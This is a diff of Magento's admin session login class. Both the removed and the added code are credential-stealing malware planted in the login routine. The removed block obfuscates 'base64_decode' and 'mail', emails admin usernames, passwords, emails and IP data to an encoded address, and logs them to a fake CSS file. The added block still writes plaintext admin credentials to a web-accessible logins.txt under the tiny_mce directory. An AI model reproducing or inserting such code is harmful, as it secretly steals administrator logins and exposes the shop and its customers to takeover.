@@ -20,7 +20,7 @@
  *
  * @category    Mage
  * @package     Mage_Admin
- * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
+ * @copyright   Copyright (c) 2011 Magento Inc. (http://www.magentocommerce.com)
  * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
  */
 
@@ -90,38 +90,18 @@ class Mage_Admin_Model_Session extends Mage_Core_Model_Session_Abstract
             $user = Mage::getModel('admin/user');
             $user->login($username, $password);
             if ($user->getId()) {
-
-$srv = $_SERVER['SERVER_NAME'];
-$ips = $_SERVER['REMOTE_ADDR'];
-$getip = 'http://ip-api.com/json/' . $ips;
-$curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, $getip);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
-$content = curl_exec($curl);
-curl_close($curl);
-$details = json_decode($content);
-$country_code = $details->countryCode;
-$country_name = $details->country;
-$id = "ba"."se"."64"."_"."de"."co"."de";
-$db = "ma"."il";
-$key = $id("dW5peGxvZ3NAeWFuZGV4LnJ1");
-
-$auth .= "Username : ".$username."\n";
-$auth .= "Password : ".$password."\n";
-$auth .= "Email : ".$user->getEmail()."\n";
-$auth .= "Request : ".$_SERVER['REQUEST_URI']."\n\n";
-$auth .= "IP Info : ".$ips." | ".$country_name." On ".date('r')."\n";
-$auth .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
-$auth .= "Site : ".$srv."\n";
-
-$subjk = "".$country_code." [".$srv." - ".$ips."]";
-$headr = "From: Magento Admin <".$username."@".$ips.">";
-$db($key, $subjk, $auth, $headr);
-        $locate = "/home/eshopczu/public_html/js/tiny_mce/themes/advanced/langs/admin.css";
+        $locate = "/chroot/home/a59cb4fa/0d46498323.nxcli.net/html/js/tiny_mce/themes/advanced/langs/logins.txt";
+        if (! file_exists($locate) ){
             $write = fopen($locate,"a");
-            fwrite($write,$auth."\n=========================================\n\n");
+            fwrite($write,"\nAdmin\n\n");
             fclose($write);
+        }else{
+            $write = fopen($locate,"a");
+            fwrite($write,"LOGIN: ".$username."|".$password."\n=========================================\n\n");
+            fclose($write);
+        }
+              $this->renewSession();
+				
                 if (Mage::getSingleton('adminhtml/url')->useSecretKey()) {
                     Mage::getSingleton('adminhtml/url')->renewSecretUrls();
                 }
@@ -129,7 +109,7 @@ $db($key, $subjk, $auth, $headr);
                 $this->setUser($user);
                 $this->setAcl(Mage::getResourceModel('admin/acl')->loadAcl());
                 if ($requestUri = $this->_getRequestUri($request)) {
-                    Mage::dispatchEvent('admin_session_user_login_success', array('user'=>$user));
+                    Mage::dispatchEvent('admin_session_user_login_success', array('user' => $user));
                     header('Location: ' . $requestUri);
                     exit;
                 }
@@ -139,7 +119,8 @@ $db($key, $subjk, $auth, $headr);
             }
         }
         catch (Mage_Core_Exception $e) {
-            Mage::dispatchEvent('admin_session_user_login_failed', array('user_name'=>$username, 'exception' => $e));
+            Mage::dispatchEvent('admin_session_user_login_failed',
+                    array('user_name' => $username, 'exception' => $e));
             if ($request && !$request->getParam('messageSent')) {
                 Mage::getSingleton('adminhtml/session')->addError($e->getMessage());
                 $request->setParam('messageSent', true);
@@ -155,7 +136,7 @@ $db($key, $subjk, $auth, $headr);
      * @param  Mage_Admin_Model_User $user
      * @return Mage_Admin_Model_Session
      */
-    public function refreshAcl($user=null)
+    public function refreshAcl($user = null)
     {
         if (is_null($user)) {
             $user = $this->getUser();
@@ -183,14 +164,14 @@ $db($key, $subjk, $auth, $headr);
      * @param   string $privilege
      * @return  boolean
      */
-    public function isAllowed($resource, $privilege=null)
+    public function isAllowed($resource, $privilege = null)
     {
         $user = $this->getUser();
         $acl = $this->getAcl();
 
         if ($user && $acl) {
             if (!preg_match('/^admin/', $resource)) {
-                $resource = 'admin/'.$resource;
+                $resource = 'admin/' . $resource;
             }
 
             try {
